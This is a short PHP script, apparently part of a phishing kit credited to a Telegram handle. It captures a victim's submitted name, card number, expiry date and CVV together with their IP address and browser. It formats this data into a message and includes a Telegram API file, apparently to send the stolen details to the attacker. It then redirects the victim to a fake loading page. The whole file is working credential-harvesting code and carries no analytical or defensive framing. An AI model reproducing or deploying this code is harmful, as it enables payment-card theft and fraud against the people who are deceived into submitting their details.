<?php
/**
 * @telegram   :   @Fuzzba 
 * Author      :   Fuzzba 
 */
session_start();


$InfoDATE   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 


$one = $_SESSION['one'] = $_POST['one'];
$two = $_SESSION['two'] = $_POST['two'];
$three = $_SESSION['three'] = $_POST['three'];
$four = $_SESSION['four'] = $_POST['four'];



$hexor = '@Fuzzba
name: '.$_SESSION["one"].' 
cc: '.$_SESSION["two"].' 
exp: '.$_SESSION["three"].' 
cvv: '.$_SESSION["four"].' 
ip: '.$_SERVER['REMOTE_ADDR'].' 
';







include("TelegramApi.php"); 



header('Location: ../loading3.php');


?>


